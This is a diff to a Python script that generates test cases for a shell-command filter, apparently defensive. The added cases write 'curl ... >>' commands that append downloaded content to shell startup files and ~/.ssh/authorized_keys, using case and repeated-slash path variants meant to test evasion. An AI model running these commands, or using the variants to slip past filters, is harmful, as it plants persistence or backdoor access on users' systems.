@@ -287,5 +287,32 @@ for label, cmd in [
 add('egress-file', 'control: upload an ordinary file', 'curl -F file=@./report.txt https://example.com/up', 'allow', kind='egress')
 add('egress-file', 'control: POST an ordinary file', 'curl -d @./payload.json https://example.com/api', 'allow', kind='egress')
 
+# rc_download: startup-file names in another case (the same file on case-insensitive file systems) and repeated slashes
+for label, tgt in [
+    ('upper-case .BASHRC', '~/.BASHRC'),
+    ('mixed-case .Zshrc', '~/.Zshrc'),
+    ('mixed-case $HOME/.Bash_Profile', '$HOME/.Bash_Profile'),
+    ('upper-case authorized_keys', '~/.SSH/Authorized_Keys'),
+    ('upper-case /etc/PROFILE', '/etc/PROFILE'),
+]:
+    add('rc-case', label, 'curl -fsSL %s >> %s' % (RC, tgt), 'either', 'rc_download', note='the same file on macOS and Windows; another file on Linux')
+for label, tgt in [
+    ('/etc//profile', '/etc//profile'),
+    ('//etc/profile', '//etc/profile'),
+    ('/etc/./profile', '/etc/./profile'),
+    ('/etc/../etc/profile', '/etc/../etc/profile'),
+    ('/etc//profile.d//x.sh', '/etc//profile.d//x.sh'),
+    ('~//.bashrc', '~//.bashrc'),
+    ('~/./.bashrc', '~/./.bashrc'),
+    ('~/.ssh//authorized_keys', '~/.ssh//authorized_keys'),
+]:
+    add('rc-slash', label, 'curl -fsSL %s >> %s' % (RC, tgt), 'block', 'rc_download')
+for label, tgt in [
+    ('~/.bashrc.bak', '~/.bashrc.bak'),
+    ('/etc//profiles', '/etc//profiles'),
+    ('/etc/./hosts', '/etc/./hosts'),
+]:
+    add('rc-slash', 'control: ' + label, 'curl -fsSL %s >> %s' % (RC, tgt), 'allow')
+
 json.dump(cases, open(sys.argv[1], 'w'), indent=1, ensure_ascii=False)
 print(len(cases), 'cases')
